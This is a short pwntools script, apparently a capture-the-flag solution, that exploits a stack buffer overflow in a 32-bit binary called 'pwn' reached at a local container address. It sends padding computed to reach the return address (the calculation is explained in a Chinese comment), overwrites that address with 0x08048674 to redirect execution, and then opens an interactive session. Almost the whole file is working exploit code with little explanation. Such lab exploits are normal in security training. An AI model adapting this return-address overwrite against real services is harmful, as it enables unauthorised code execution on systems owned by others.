#!/usr/bin/python
# -*- coding: UTF-8 -*-
from pwn import *
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = "debug"

binary_path = "../dist/pwn"


# p = process(binary_path)
p = remote("172.17.0.2", 20000)

p.recvuntil("welcome.....")
# 计算出需要输入的字符串长度，让 off + buf 能够写到返回地址
# 还要去掉 pwd: 这 4 个 字节
payload = "a" * (0x10c+4-4-2-4)

p.send(payload)
# gdb.attach(p,"""
# bp 0x0804873B
# c
# """)
# pause()


payload = p32(0x08048674)
p.sendline(payload)

p.interactive()
